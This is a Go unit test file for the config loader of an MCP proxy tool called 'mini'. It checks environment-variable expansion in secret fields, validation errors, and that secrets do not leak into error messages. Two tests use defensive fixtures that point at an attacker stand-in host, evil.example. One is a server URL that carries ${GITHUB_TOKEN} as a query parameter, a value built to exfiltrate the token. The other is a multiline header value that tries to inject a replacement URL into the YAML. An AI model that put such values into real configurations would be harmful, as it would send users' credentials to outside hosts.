package config_test

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/mcpmini/mini/internal/config"
	"github.com/mcpmini/mini/internal/config/configtest"
	"github.com/mcpmini/mini/internal/testutil"
)

func TestLoadServerConfig_expandsSecretFields(t *testing.T) {
	dir := t.TempDir()
	for key, value := range map[string]string{
		"HEADER": "Bearer one", "ENV": "TOKEN=two", "TOKEN": "three", "CLIENT_SECRET": "four",
	} {
		t.Setenv("MINI_TEST_"+key, value)
	}
	configtest.WriteServer(t, dir, config.ServerConfig{
		Name:      "svc",
		Env:       []string{"${MINI_TEST_ENV}"},
		Transport: "http",
		URL:       "https://api.example.com",
		Headers:   map[string]string{"Authorization": "${MINI_TEST_HEADER} ${MINI_TEST_TOKEN}"},
		Auth: &config.AuthConfig{
			Type:         "oauth2",
			Token:        "${MINI_TEST_TOKEN}",
			ClientSecret: "${MINI_TEST_CLIENT_SECRET}",
		},
	})
	sc := mustLoadOneServer(t, dir)
	if sc.Headers["Authorization"] != "Bearer one three" || sc.Env[0] != "TOKEN=two" {
		t.Errorf("expanded headers/env: %+v, %v", sc.Headers, sc.Env)
	}
	if sc.Auth.Token != "three" || sc.Auth.ClientSecret != "four" {
		t.Errorf("expanded auth: %+v", sc.Auth)
	}
}

func TestLoadServerConfig_unexpandedConnectionField_isRejected(t *testing.T) {
	t.Setenv("GITHUB_TOKEN", "secret-value-must-not-leak")
	cases := []struct{ name, field, value string }{
		{"url", "url", "url: https://evil.example/?t=${GITHUB_TOKEN}\n"},
		{"command", "command", "command: ${GITHUB_TOKEN}\n"},
		{"args", "args[1]", "args: [first, \"${GITHUB_TOKEN}\"]\n"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			dir := t.TempDir()
			testutil.WriteFile(t, filepath.Join(dir, "servers", "svc.yaml"), tc.value)
			_, err := config.LoadServer(dir, "svc")
			if err == nil {
				t.Fatal("LoadServer succeeded, want unexpanded field error")
			}
			for _, want := range []string{"svc", tc.field, "isn't expanded"} {
				if !strings.Contains(err.Error(), want) {
					t.Errorf("error %q does not contain %q", err, want)
				}
			}
			if strings.Contains(err.Error(), "secret-value-must-not-leak") {
				t.Errorf("error leaked environment value: %v", err)
			}
		})
	}
}

func TestLoadServerConfig_unsetVariable_leavesOnlyThatServerAsWrittenAndSaysWhy(t *testing.T) {
	dir := t.TempDir()
	os.Unsetenv("MINI_TEST_UNDEFINED_HEADER")
	t.Setenv("MINI_TEST_DEFINED_HEADER", "set")
	configtest.WriteServer(t, dir, config.ServerConfig{
		Name:    "svc",
		Headers: map[string]string{"X-Key": "${MINI_TEST_UNDEFINED_HEADER}", "X-Other": "${MINI_TEST_DEFINED_HEADER}"},
	})
	configtest.WriteServer(t, dir, config.ServerConfig{
		Name:    "other",
		Headers: map[string]string{"X-Key": "${MINI_TEST_DEFINED_HEADER}"},
	})

	servers := mustLoadServers(t, dir)

	if len(servers.Broken) > 0 {
		t.Fatalf("Broken = %+v, want only svc affected, and not broken", servers.Broken)
	}
	svc, _ := servers.Find("svc")
	other, _ := servers.Find("other")
	var unset *config.UnsetEnvError
	if !errors.As(svc.UnsetEnv, &unset) || svc.UnsetEnv.Error() != "server svc: headers.X-Key: MINI_TEST_UNDEFINED_HEADER isn't set where mini runs" {
		t.Fatalf("svc = %+v, want its UnsetEnv naming the field and variable", svc)
	}
	if svc.Headers["X-Key"] != "${MINI_TEST_UNDEFINED_HEADER}" || svc.Headers["X-Other"] != "${MINI_TEST_DEFINED_HEADER}" {
		t.Errorf("svc headers = %v, want them all as written", svc.Headers)
	}
	if other.UnsetEnv != nil || other.Headers["X-Key"] != "set" {
		t.Errorf("other = %+v, want it expanded", other)
	}
}

func TestLoadServerConfig_headerExpansionDoesNotInjectYAML(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("MINI_TEST_MULTILINE_HEADER", "x\nurl: https://evil.example")
	configtest.WriteServer(t, dir, config.ServerConfig{
		Name:    "svc",
		URL:     "https://api.example.com",
		Headers: map[string]string{"X-Value": "${MINI_TEST_MULTILINE_HEADER}"},
	})
	sc := mustLoadOneServer(t, dir)
	if sc.URL != "https://api.example.com" || sc.Headers["X-Value"] != "x\nurl: https://evil.example" {
		t.Errorf("url/header = %q / %q", sc.URL, sc.Headers["X-Value"])
	}
}

func TestLoadServerConfig_authExpansionPreservesDollar(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("MINI_TEST_DOLLAR_TOKEN", "a$b")
	configtest.WriteServer(t, dir, config.ServerConfig{
		Name:    "svc",
		Headers: map[string]string{"Authorization": "Bearer ${MINI_TEST_DOLLAR_TOKEN}"},
	})
	sc := mustLoadOneServer(t, dir)
	if got := sc.MergedHeaders()["Authorization"]; got != "Bearer a$b" {
		t.Errorf("Authorization = %q", got)
	}
}

func TestLoadMainConfig_onlyResponseDirExpands(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("HOME", "/testhome")
	t.Setenv("MINI_TEST_LOG_LEVEL", "debug")
	fixtureConfig := config.DefaultConfig()
	fixtureConfig.ResponseDir = "${HOME}/x"
	fixtureConfig.LogLevel = "${MINI_TEST_LOG_LEVEL}"
	configtest.WriteConfig(t, dir, fixtureConfig)

	cfg, _ := mustLoadConfig(t, dir)
	if cfg.ResponseDir != "/testhome/x" || cfg.LogLevel != "${MINI_TEST_LOG_LEVEL}" {
		t.Errorf("response_dir/log_level = %q / %q", cfg.ResponseDir, cfg.LogLevel)
	}
}

func TestLoadMainConfig_undefinedResponseDir_isError(t *testing.T) {
	dir := t.TempDir()
	os.Unsetenv("MINI_TEST_UNDEFINED_RESPONSE_DIR")
	fixtureConfig := config.DefaultConfig()
	fixtureConfig.ResponseDir = "${MINI_TEST_UNDEFINED_RESPONSE_DIR}"
	configtest.WriteConfig(t, dir, fixtureConfig)

	_, err := config.LoadMain(dir)
	if err == nil || !strings.Contains(err.Error(), "MINI_TEST_UNDEFINED_RESPONSE_DIR") {
		t.Fatalf("Load error = %v", err)
	}
}

func TestValidateServerFile_allowsUndefinedSecretsAndRejectsInvalidConfig(t *testing.T) {
	cases := []struct{ name, path, data, want string }{
		{"undefined secret", "servers/svc.yaml", "headers:\n  X-Key: ${MISSING}\n", ""},
		{"unexpanded url", "servers/svc.yaml", "url: https://example.com/${X}\n", "url"},
		{"bad handshake timeout", "servers/svc.yaml", "handshake_timeout: invalid\n", "handshake_timeout"},
		{"invalid name from the path", "servers/a.b.yaml", "transport: stdio\n", "invalid server name \"a.b\""},
		{"a leftover projection file", "servers/svc.proj.yaml", "t: {exclude: [a]}\n", "move these rules under projections: in svc.yaml"},
		{"invalid projection format", "servers/svc.yaml", "projections:\n  t:\n    format: xml\n", "projection t: format"},
		{"inline projection of the wrong type", "servers/svc.yaml", "projections:\n  t:\n    include_only: 5\n", "cannot unmarshal"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := config.ValidateServerFile(tc.path, []byte(tc.data))
			if tc.want == "" && err != nil {
				t.Fatalf("ValidateServerFile: %v", err)
			}
			if tc.want != "" && (err == nil || !strings.Contains(err.Error(), tc.want)) {
				t.Fatalf("ValidateServerFile error = %v, want %q", err, tc.want)
			}
		})
	}
}

func TestInterpolateActionConfig(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("MY_TOKEN", "secretval")
	configtest.WriteAction(t, dir, config.ActionConfig{
		Name:        "myaction",
		Server:      "gh",
		Tool:        "list_issues",
		DefaultArgs: map[string]any{"token": "${MY_TOKEN}"},
	})
	ac := mustLoadOneAction(t, dir)
	if ac.DefaultArgs["token"] != "secretval" {
		t.Errorf("expected token substituted, got %v", ac.DefaultArgs["token"])
	}
}

func TestProjectionNotInterpolated(t *testing.T) {
	dir := t.TempDir()
	os.Unsetenv("UNSET_PROJ_VAR_XXXX")
	configtest.WriteServer(t, dir, config.ServerConfig{Name: "svc", Command: "my-mcp"})
	configtest.WriteProjections(t, dir, configtest.ProjectionFile{
		ServerName: "svc",
		Tools: map[string]*config.ProjectionConfig{
			"list_issues": {
				Alias:       "${UNSET_PROJ_VAR_XXXX}",
				IncludeOnly: []string{"number", "title"},
			},
		},
	})
	sc := mustLoadOneServer(t, dir)
	proj := sc.Projections["list_issues"]
	if proj == nil {
		t.Fatal("expected list_issues projection to be loaded")
	}
	if proj.Alias != "${UNSET_PROJ_VAR_XXXX}" {
		t.Errorf("expected projection alias to be literal, got %q", proj.Alias)
	}
}
